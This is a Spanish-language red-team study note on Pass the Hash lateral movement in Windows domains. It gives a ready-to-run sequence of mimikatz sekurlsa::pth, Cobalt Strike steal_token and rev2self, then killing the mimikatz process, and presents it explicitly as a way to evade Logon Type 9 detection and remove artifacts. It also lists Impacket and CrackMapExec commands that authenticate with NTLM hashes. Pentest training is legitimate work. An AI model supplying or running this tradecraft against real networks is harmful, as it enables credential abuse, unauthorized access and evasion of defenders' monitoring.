---
tags: [lateral-movement, pth, ntlm, opsec]
status: done
platform: windows
---

# Pass the Hash

> Autenticarse usando el hash NTLM directamente, sin necesitar la contraseña en texto claro.

---

## Concepto

NTLM no requiere la contraseña para la autenticación — usa el hash directamente en el protocolo de challenge-response. Si tenemos el hash, tenemos la contraseña (funcionalmente).

**Limitación:** Solo funciona con autenticación NTLM. Si el servicio exige Kerberos, PtH no aplica directamente → usar [[04-lateral-movement/user-impersonation/pass-the-ticket|Pass The Ticket]].

---

## Problema de Detección

El PtH "clásico" con mimikatz (`sekurlsa::pth`) genera eventos de logon con:
- `Logon Type 9` (NewCredentials) — detectable
- El proceso hijo corre con el token modificado pero con `Logon Type 9` en los logs

**Solución Manual (evasión):**

```
# 1. Mimikatz — crear proceso con el hash (genera proceso nuevo)
mimikatz> sekurlsa::pth /user:admin /domain:corp.local /ntlm:<HASH> /run:"cmd.exe"

# 2. Cobalt Strike — steal_token del proceso generado
beacon> steal_token <PID_del_cmd_generado>

# 3. Revocar impersonación cuando no necesitemos más
beacon> rev2self

# 4. Matar el proceso de mimikatz (para no dejar artefactos)
beacon> kill <PID>
```

**Por qué funciona:** En lugar de usar directamente el token con Logon Type 9, lo robamos y lo asociamos a nuestro propio proceso, mezclándonos mejor con tráfico legítimo.

---

## Alternativas

- **Impacket (Linux):** `psexec.py`, `wmiexec.py`, `smbexec.py` — todos aceptan `-hashes :NTLM`
- **CrackMapExec:** `crackmapexec smb TARGET -u admin -H NTLM_HASH`

---

## OPSEC

> ⚠️ PtH puro (Logon Type 9) es conocido y lo detectan bien los EDRs modernos.
> La secuencia mimikatz pth → steal_token → kill PID es más ruidosa al inicio pero limpia el artefacto.

